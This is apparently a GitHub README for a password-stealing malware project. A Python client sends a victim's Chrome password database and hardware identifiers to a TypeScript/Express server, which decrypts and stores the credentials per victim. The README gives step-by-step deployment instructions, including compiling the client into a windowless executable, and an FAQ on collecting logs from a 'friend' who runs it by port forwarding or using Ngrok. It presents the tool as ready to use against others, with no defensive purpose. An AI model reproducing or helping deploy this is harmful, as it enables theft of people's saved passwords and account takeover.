# Password Logger Server

This is a basic password logger with a backend made in TypeScript which is using Express.
<br>
The payload for this project is ~*50* lines long, which results in a very small payload size.

## How does this work?

Normally, password stealing malware would decrypt the passwords with the Chrome Master Key
on the client's machine.
<br>
<br>
Though, in this malware, the client will send the Chrome password database along with hardware identifiers
to the server which will then decrypt the passwords and save them in to a directory made with the hardware identifiers; (this is to identify
different victims that run the payloads data)

## How do I set this up?

### Firstly, we will set up the server.

1. Go to this line (code snippet linked) and change the directory according to your computer. By change it according to your computer, I mean copy the exact path of the storage folder in the server directory and paste it into that variable.https://github.com/brlyndev/PasswordLogger/blob/a60e6495e6f0d4bb6dafdcd6f9d600f666293d29/server/decrypt.py#L21-L26
2. CD into the server directory and run `npm install` (Make sure you have NodeJS *v18.12.1* installed)
3. To start the server, CD into the server directory and run `npm start` in the console.

After you have ran `npm start`, the server will be running and listening for logs.

### Now, we will set up the client.

(Make sure you have Python *v3.11.x* installed)

1. CD into the client directory and run `python install -r requirements.txt`.
2. Now, (*optionally*) you can build the Python file into an executable.<br>To do this, CD into the client directory and run `pip install pyinstaller && pyinstaller --onefile --noconsole index.py`.<br>The output will be put into the "dist" directory

## Common Errors

### Q: "*i tried sending to my friend and when they ran it, it didn't send me the logs!!*"

**A: This will only work on your local computer unless you port forward, or use something like Ngrok.**
If you do decide to port forward or use something like Ngrok, be sure to change the domain in the `./client/index.py` file.
https://github.com/brlyndev/PasswordLogger/blob/a60e6495e6f0d4bb6dafdcd6f9d600f666293d29/client/index.py#L24-L28
